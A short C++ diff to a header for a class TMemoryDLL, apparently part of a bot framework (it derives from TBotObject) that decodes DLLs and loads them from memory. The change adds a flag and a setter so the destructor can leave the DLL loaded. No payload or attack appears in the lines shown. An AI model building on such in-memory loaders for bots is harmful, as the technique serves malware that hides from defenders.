@@ -88,6 +88,7 @@ class TMemoryDLL : public TBotObject
 {
 private:
 	HMEMORYMODULE FHandle;
+	bool   FNotFree; //если true, то в деструкторе не уничтожаем длл
 public:
 	TMemoryDLL(const void* DllBuf);
 	~TMemoryDLL();
@@ -117,6 +118,10 @@ public:
 	//                    для буфера пришлось выделить память
 	//---------------------------------------------------------
 	bool   static DecodeDll(const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, bool &NewBufAllocated);
+	void SetNotFree( bool v = true )
+	{
+		FNotFree = v;
+	}
 };
 
 
